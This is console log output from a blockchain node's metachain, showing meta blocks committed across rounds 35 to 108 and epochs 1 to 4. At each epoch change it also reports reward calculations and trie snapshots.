[0;32mINFO [0m[2026-10-06 22:05:27.021] [process/block]      [metachain/1/35/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 35 [0;32mnonce[0m = 32 [0;32mhash[0m = 2afc95850d7229daff4c87f028c9559c53d83471dbdc89e86b3a3b15ae0fb566 
[0;32mINFO [0m[2026-10-06 22:05:33.019] [process/block]      [metachain/1/36/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 36 [0;32mnonce[0m = 33 [0;32mhash[0m = ae578af34148f27712634c967e13c62aea8c4812943c9db14ee02b991516babd 
[0;32mINFO [0m[2026-10-06 22:05:39.024] [process/block]      [metachain/1/37/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 37 [0;32mnonce[0m = 34 [0;32mhash[0m = 49b3156756bb669a80738e53735e045d0455a6b7f872b73312f193c35a700b7f 
[0;32mINFO [0m[2026-10-06 22:05:45.021] [process/block]      [metachain/1/38/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 38 [0;32mnonce[0m = 35 [0;32mhash[0m = d5a8ee281c2d0464f951f8f64262fa7b95323486ca3f1256cfe6913950f6bc85 
[0;32mINFO [0m[2026-10-06 22:05:51.012] [process/block]      [metachain/1/39/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 39 [0;32mnonce[0m = 36 [0;32mhash[0m = a296d0354ec5d6e58233661c4f543c847bc20d8311794921c983c50a2a0f1207 
[0;32mINFO [0m[2026-10-06 22:05:57.021] [process/block]      [metachain/1/40/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 40 [0;32mnonce[0m = 37 [0;32mhash[0m = 89b25b7ba3d1ced41327ccb2e1c63a0681171d2d25118f2542923bda02c3b041 
[0;32mINFO [0m[2026-10-06 22:06:03.013] [process/block]      [metachain/1/41/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 41 [0;32mnonce[0m = 38 [0;32mhash[0m = e69ee1031827ea72ee4a12c758239c12a360811214117d30e32e692aeeecf5f0 
[0;32mINFO [0m[2026-10-06 22:06:09.018] [process/block]      [metachain/1/42/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 42 [0;32mnonce[0m = 39 [0;32mhash[0m = 4724d6d9ddb4672d5596eea8e127104aa3cb56e3effb7081e8764b399397ba48 
[0;32mINFO [0m[2026-10-06 22:06:15.023] [process/block]      [metachain/1/43/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 742ae90f4ee534d1a73a4770f1dd9e9aedbaae28f91d86ae34cdc78959f9913d 
[0;32mINFO [0m[2026-10-06 22:06:21.026] [process/block]      [metachain/1/44/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = 2574f49d4fbd532fecb5bf2cc8628b55ebabf3f5ffbc2005a05a4a476534b24e 
[0;32mINFO [0m[2026-10-06 22:06:27.024] [process/block]      [metachain/1/45/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = 95e15a4d4a4849b001d8b6a08550bad7a8cfeae25928a121b5af4da34d0882e7 
[0;32mINFO [0m[2026-10-06 22:06:33.017] [process/block]      [metachain/1/46/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 63c9908561006f1f9078ddcb1715779cde35c20c310056488425f9820a6c7192 
[0;32mINFO [0m[2026-10-06 22:06:39.020] [process/block]      [metachain/1/47/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = 970b591eb974c8db5fc90ab556d0a93d6c72fef0e523b7425038834f189f99a8 
[0;32mINFO [0m[2026-10-06 22:06:45.020] [process/block]      [metachain/1/48/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 9e0d21b36e4019d2e7f82178a832998345f4d471ac94cb6b8f008e1086b6f02a 
[0;32mINFO [0m[2026-10-06 22:06:51.023] [process/block]      [metachain/1/49/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = 6a837de7cf97dc3e441c081070ffcbdb387a7814319c707373418e49cd8fab21 
[0;32mINFO [0m[2026-10-06 22:06:57.019] [process/block]      [metachain/1/50/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = c45f120287f27fea5989abda5009047044596eeb7ad7f5e92873170971f2b5ee 
[0;32mINFO [0m[2026-10-06 22:07:03.015] [processProxy]       [metachain/1/51/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:03.015] [..hStart/metachain] [metachain/2/51/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:07:03.015] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewardsCreatorProxy.switchToRewardsCreatorV2 
[0;32mINFO [0m[2026-10-06 22:07:03.015] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3949171031307706200 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:07:04.218] [process/block]      [metachain/2/51/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 9a4af4e50bfcd50eca58a91c2d292729269aa01b4271e629928948e96d46c52a 
[0;32mINFO [0m[2026-10-06 22:07:04.218] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = c014cc26b50d951bcb4181b792bf392b66e1b31a3a8e423ba3e44b25b86c4c2e [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:04.218] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 5cde8492bd57c188e068455609c8b4c532ed63f49c4bd7f0312e2668238f4497 [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:09.023] [process/block]      [metachain/2/52/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 1e04022185adb523d523b8997926764612b46cfbc616e0ed119c4033af1e2209 
[0;32mINFO [0m[2026-10-06 22:07:15.026] [process/block]      [metachain/2/53/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 027e60845e3e39ecda89d26e67bd3f5fd3d72adc76fad6cd4411dc19cea24d37 
[0;32mINFO [0m[2026-10-06 22:07:21.028] [process/block]      [metachain/2/54/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = ba6202b9f7f37dbc08dd40d112673a7d7c2a2e045f0930a827b37645bd622e1c 
[0;32mINFO [0m[2026-10-06 22:07:27.022] [process/block]      [metachain/2/55/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = abe9d1b503d6baec04e5c5262722c3b5fed72cd4ac5b986dfd06df9aac721106 
[0;32mINFO [0m[2026-10-06 22:07:33.020] [process/block]      [metachain/2/56/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = a3b58fd181840f17790fe70f8e498c54d3305a95627fac48b0fffaf09bf077cc 
[0;32mINFO [0m[2026-10-06 22:07:39.016] [process/block]      [metachain/2/57/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = f8306f4e7ca39bb9b6f13d11a744d378704247606a11c96535a801479e2727cd 
[0;32mINFO [0m[2026-10-06 22:07:45.020] [process/block]      [metachain/2/58/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = 916c97f31d40ce2d78f3f17075160ad02a226e25014b1c4ffaf3abbf411753ae 
[0;32mINFO [0m[2026-10-06 22:07:51.021] [process/block]      [metachain/2/59/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = d5925204a26c786a62e96cbd2910ac734e0cd847184912cdac40e06e218b155f 
[0;32mINFO [0m[2026-10-06 22:07:57.017] [process/block]      [metachain/2/60/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 4ec5140161c5ccae6d507183cef503c55b6b92e013c2034cde4cbcb132d0b79d 
[0;32mINFO [0m[2026-10-06 22:08:03.015] [process/block]      [metachain/2/61/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = e54920a5fea78d8f95da4a974d65c4139b13a4634f41f9049e5fa9e6516d95e4 
[0;32mINFO [0m[2026-10-06 22:08:09.023] [process/block]      [metachain/2/62/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 869a687a3d788554043e7561420a9766034c890e53ab06788aebf3f21b1019ae 
[0;32mINFO [0m[2026-10-06 22:08:15.026] [process/block]      [metachain/2/63/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 817f72636dc9532dfcad857df0cdc1f663b1493e541efcf6fdbf92976bba8514 
[0;32mINFO [0m[2026-10-06 22:08:21.022] [process/block]      [metachain/2/64/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = 9cfeba2bb15b62056c32a409f2088b2e36b791c0c52a9c01193334a0d8cd53b1 
[0;32mINFO [0m[2026-10-06 22:08:27.021] [process/block]      [metachain/2/65/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = 27c5c3abf399f6e01998177b295439476172ba70b695e10dcd0fa31138fd6336 
[0;32mINFO [0m[2026-10-06 22:08:33.023] [process/block]      [metachain/2/66/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = 54e163f5a4f7dbd0ed8c2837b9cd668624b822e00f825dfbd42424c7c766c3a5 
[0;32mINFO [0m[2026-10-06 22:08:39.019] [process/block]      [metachain/2/67/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = 9a19563a22e87834d81dc6b2ee4b45044199830ad5804639cd687ea70681ffb6 
[0;32mINFO [0m[2026-10-06 22:08:45.019] [process/block]      [metachain/2/68/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = ddbc29f2adabdfd6fe96fe42cd5a01529e55bd5e043735245b12e22cb5a9c808 
[0;32mINFO [0m[2026-10-06 22:08:51.018] [process/block]      [metachain/2/69/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = 2f512e3d63fd05cfa6dc578b521453c85f19a5c9b0a7f89bf87b68ccc59b14dd 
[0;32mINFO [0m[2026-10-06 22:08:57.019] [process/block]      [metachain/2/70/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = c592b1e3e3440b5c9502c84cccb95b6b7bd5ab301929f4a6d97acc59fe5387c3 
[0;32mINFO [0m[2026-10-06 22:09:03.016] [process/block]      [metachain/2/71/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = c186d35b85bd82fd2cc17ac72ab2926e0a573d0356042ac0ccc2d76e5ec1af6c 
[0;32mINFO [0m[2026-10-06 22:09:09.020] [process/block]      [metachain/2/72/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 6d2355165a7f16836aa80d1fc97d9b5d9e84251a60880f0bc5e583a964af65ce 
[0;32mINFO [0m[2026-10-06 22:09:15.026] [process/block]      [metachain/2/73/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = a9a52ed8100e41548bf4ef0497a16713142d124cc9537f4c879c47cffb6a9671 
[0;32mINFO [0m[2026-10-06 22:09:21.012] [processProxy]       [metachain/2/74/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:21.013] [..hStart/metachain] [metachain/3/74/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:09:21.013] [..hStart/metachain] [metachain/3/74/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3668827386355432167 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:09:22.170] [process/block]      [metachain/3/74/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = 39df0bf736a8cda05c31cf223144dabcc93d5e11f37778f35fbc9126b60b4c40 
[0;32mINFO [0m[2026-10-06 22:09:22.170] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:22.170] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = dc15a69e39a4580ddb14fc9cb0f5ceb786982ca4836e357b660d8b659397b044 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:27.025] [process/block]      [metachain/3/75/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e3c107f41ec0a2f53b46b9d6f7e576208ef14e43103630e96972252380c2f71c 
[0;32mINFO [0m[2026-10-06 22:09:33.026] [process/block]      [metachain/3/76/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 6b0e17cff9a368cdae50ea723705a7de3b69e5439f6745a2d69f495a3f5f9858 
[0;32mINFO [0m[2026-10-06 22:09:39.018] [process/block]      [metachain/3/77/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = aa5b121789805feb934081b4748c55878ecb7da11ade44d5656651ebfe07fb76 
[0;32mINFO [0m[2026-10-06 22:09:45.024] [process/block]      [metachain/3/78/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = 490e9572193c7f37ccc66004354116ad8bf137c965d763464564aae2ea40b93e 
[0;32mINFO [0m[2026-10-06 22:09:51.021] [process/block]      [metachain/3/79/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = e47c079155827e3177fb75338da1710765c08c7a6252982a429641a736b2a59f 
[0;32mINFO [0m[2026-10-06 22:09:57.021] [process/block]      [metachain/3/80/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = 116da5e8cb72c52359b5854b6328032622266ff981727e65af6fee5f677ca837 
[0;32mINFO [0m[2026-10-06 22:10:03.017] [process/block]      [metachain/3/81/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = c9a82c6aae1bb6bd40fab1b61876b3780ee282539195024f1e157711330e4771 
[0;32mINFO [0m[2026-10-06 22:10:09.022] [process/block]      [metachain/3/82/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 71824848c29f7d689abb45869019d92bb8fdca375b578796680b18260eec1051 
[0;32mINFO [0m[2026-10-06 22:10:15.018] [process/block]      [metachain/3/83/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 342d9189b38db4fa8c3b6e5f78a9f070ca898514ad3b6c94d09d116078f13731 
[0;32mINFO [0m[2026-10-06 22:10:21.020] [process/block]      [metachain/3/84/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 15289ba5c07e3344c8276148f84eb70ebd402213af4bf5b728272d75a3c94ca1 
[0;32mINFO [0m[2026-10-06 22:10:27.021] [process/block]      [metachain/3/85/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = d39921e2eece0151621b0b05eca40de5d5a234ced526d0b207e3f16ac41c636b 
[0;32mINFO [0m[2026-10-06 22:10:33.021] [process/block]      [metachain/3/86/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 20bb9fe170d1ce992230320dc0c2702e14c1f0801fb45f84c01cace83e9c8072 
[0;32mINFO [0m[2026-10-06 22:10:39.020] [process/block]      [metachain/3/87/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 394aa6b6b3fc0eba2c7be1ba47d98a0a808794db4e3d1d5ba0a794ce1fc0c460 
[0;32mINFO [0m[2026-10-06 22:10:45.022] [process/block]      [metachain/3/88/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 1590f2145e6ff1bf08927d345a96d77ce3a0c00e4675c58cf45edf1a8ebb0fa0 
[0;32mINFO [0m[2026-10-06 22:10:51.035] [process/block]      [metachain/3/89/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 18f93ff1e44b76827682ae5d2ab2c5eb9d392005b489a45181d11b2d71587e4f 
[0;32mINFO [0m[2026-10-06 22:10:57.022] [process/block]      [metachain/3/90/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 54d5a7268d8c5a9cff83d17e7f28af1f66116cec3164efab5a5e6bc113d5bfb9 
[0;32mINFO [0m[2026-10-06 22:11:03.019] [process/block]      [metachain/3/91/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = e2a395548744a21d55c3348e50b0970c05eab935084a84808420a12a65ba29bf 
[0;32mINFO [0m[2026-10-06 22:11:09.020] [process/block]      [metachain/3/92/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = b9000723b780dcbdd3303c02169aaf9a6a67a061e54181c0fbea421533904eea 
[0;32mINFO [0m[2026-10-06 22:11:15.024] [process/block]      [metachain/3/93/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = a047994d2bd288e73d64cf967a2c8aa81c5cbea9bc69267c8f2a5ae4b805ddca 
[0;32mINFO [0m[2026-10-06 22:11:21.020] [process/block]      [metachain/3/94/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = e593dafa4bbd3ce51d9762a9a3d2ad8c24b0bde274bef1dbfa2b2dea501e2d7b 
[0;32mINFO [0m[2026-10-06 22:11:27.015] [process/block]      [metachain/3/95/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = aa20ba0402ce43e10fb77851d5db12e246efc6a429f596d489adc249f29161dc 
[0;32mINFO [0m[2026-10-06 22:11:33.020] [process/block]      [metachain/3/96/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = c45ed6389c88e2d2c18a964feb33e87855e34274f298d1263cb249c486bdeeef 
[0;32mINFO [0m[2026-10-06 22:11:39.019] [processProxy]       [metachain/3/97/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:39.020] [..hStart/metachain] [metachain/4/97/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:11:39.020] [..hStart/metachain] [metachain/4/97/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673434658148159309 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:11:40.226] [process/block]      [metachain/4/97/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = d97d6366ddaf6c951512b1ed0307e1b11a5b6014a740f879d3804379517df773 
[0;32mINFO [0m[2026-10-06 22:11:40.227] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:40.227] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 1d8f0eaef835a1b4ce126bb997b2e3493fc1839419674119d2fd5f4656c82ca9 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:45.021] [process/block]      [metachain/4/98/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 51ac71436f4951c2f5ab6593b92534367dde96f2127ff9b0bc064d91bb8b93bd 
[0;32mINFO [0m[2026-10-06 22:11:51.018] [process/block]      [metachain/4/99/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 3bf36fa4535e682b5022fc065ba0c03528efc937806cc2b36bac8b0b0b12ab41 
[0;32mINFO [0m[2026-10-06 22:11:57.030] [process/block]      [metachain/4/100/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 3d1385849c2a9a57acca75f86c065ce300b95ea89c80ed347de0733b2c51dfef 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [metachain/4/101/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 14b48d871da346dca320aca2b8ec24f55715c8d129f354161252ab0709851270 
[0;32mINFO [0m[2026-10-06 22:12:09.020] [process/block]      [metachain/4/102/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = f2a64ad009da321b4597927157a9d44495a4f838fd2a9743def0a43332197d3d 
[0;32mINFO [0m[2026-10-06 22:12:15.023] [process/block]      [metachain/4/103/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 0a0aebc38ddb7774fa83becf49d66b815e2b7373a53e896cf4ac6178e4ff88c1 
[0;32mINFO [0m[2026-10-06 22:12:21.038] [process/block]      [metachain/4/104/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 93909d5419c830ea178befcff0ab7d46b4fc349d6f77f77eb03fb90738ba82b9 
[0;32mINFO [0m[2026-10-06 22:12:27.019] [process/block]      [metachain/4/105/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = aef22663c6cf3c9081285f817494ca508f632ed5c19a7e51507ef0f64013ab73 
[0;32mINFO [0m[2026-10-06 22:12:33.019] [process/block]      [metachain/4/106/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 50c9479a796694f65a265beb23fdf69759624225e6875979fa249961b72b3a92 
[0;32mINFO [0m[2026-10-06 22:12:39.021] [process/block]      [metachain/4/107/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = c7e85839a7854379c8234929d109950287e12724968ddab064f951f420ff4893 
[0;32mINFO [0m[2026-10-06 22:12:45.021] [process/block]      [metachain/4/108/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = 6880f6f148acbdc2fd846db3852e42f14afc7c6f560896a88c760bcb1bf787c2 
